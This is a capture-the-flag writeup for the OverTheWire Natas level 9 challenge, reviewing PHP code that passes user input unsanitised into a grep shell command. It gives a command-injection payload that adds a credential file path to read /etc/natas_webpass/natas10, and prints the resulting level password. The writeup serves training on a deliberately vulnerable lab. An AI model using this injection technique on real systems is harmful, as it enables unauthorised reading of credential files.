# OverTheWire: Natas Level 9 -> Level 10 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to retrieve the access password for Natas Level 10. The application provides a text search feature and exposes its backend PHP implementation. 

By performing a white-box source code review, we can analyze how the server processes the user-supplied query string.

### Source Code Review:
The source code contains the following critical block:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The application takes the user input `$key` via the `needle` parameter and directly concatenates it into a system shell command execution function `passthru()`. Because the input is not sanitized or escaped using functions like `escapeshellarg()` or `escapeshellcmd()`, the application is highly vulnerable to **Command Injection**.

## 2. Solution Strategy & Exploitation
Instead of disrupting the shell sequence with traditional command splitters (such as `;`, `|`, or `&`), we can manipulate the argument structure of the `grep` command itself. 

The standard syntax for grep is `grep [options] PATTERN [FILE...]`. By injecting a pattern along with an additional absolute file path, we can force `grep` to search within the system's sensitive credential store.

### Payload Construction:
If we inject the following string into the input field:
```bash
"" /etc/natas_webpass/natas10
```

The underlying shell will execute:
```bash
grep -i "" /etc/natas_webpass/natas10 dictionary.txt
```

This instructs `grep` to look for any matching content (an empty string matches every line) inside both `/etc/natas_webpass/natas10` and `dictionary.txt`.

### Step-by-step Execution:
1. Access the challenge input form.
2. Input the crafted payload: `"" /etc/natas_webpass/natas10` into the search box and submit.
3. The server executes the manipulated command and prints the matched lines from the target file onto the screen.

### Result Analysis:
The `grep` command reads the password file and outputs its contents along with the file prefix:
```text
/etc/natas_webpass/natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```

## 3. Flag / Final Result
* **Natas Level 10 Password**: `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`
